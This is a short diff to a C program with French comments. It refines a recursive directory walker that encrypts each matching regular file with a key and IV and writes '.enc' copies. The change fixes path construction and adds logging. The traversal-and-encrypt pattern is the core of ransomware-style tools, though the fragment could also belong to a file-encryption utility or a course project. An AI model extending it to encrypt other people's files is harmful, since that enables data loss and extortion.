@@ -64,19 +64,23 @@ void dirContent(const char *rootpath, unsigned char *key, unsigned char *iv, cha
             strncat(new_path,rootpath,strlen(rootpath));
             strcat(new_path,"/");
             strncat(new_path,sd ->d_name,strlen(sd->d_name));
-            printf("Path:%s\n",new_path);
 
-            
             dirContent(new_path,key,iv,mode);
             free(new_path);
         }
 
         else{
-            if( sd -> d_type == DT_REG){
+            if( sd -> d_type == DT_REG && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){ // On vérifie que le fichier est un fichier régulier et qu'il n'est pas le dossier courant ou le dossier parent
                 char* filepath = (char*)malloc(strlen(rootpath)+strlen(sd->d_name)+2);
+                strcpy(filepath,""); // clean memory of the variable
+                strncat(filepath,rootpath,strlen(rootpath));
+                strcat(filepath,"/");
+                strncat(filepath,sd ->d_name,strlen(sd->d_name));
 
                 if(doUseFile(sd -> d_name) == true){
+                
                     printf("Nom du fichier: %s\n",sd->d_name);
+                
                     if(strcmp(mode,"-e") == 0){
                         encryptFile(filepath,key,iv);
                     }
@@ -212,7 +216,7 @@ int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
 }
 
 int encryptFile(char *filename, unsigned char *key, unsigned char *iv){
-
+    printf("Encrypting file %s\n",filename);
     char *filepath_enc = malloc(strlen(filename) + 5);
     strcpy(filepath_enc, filename);
     strcat(filepath_enc, ".enc");
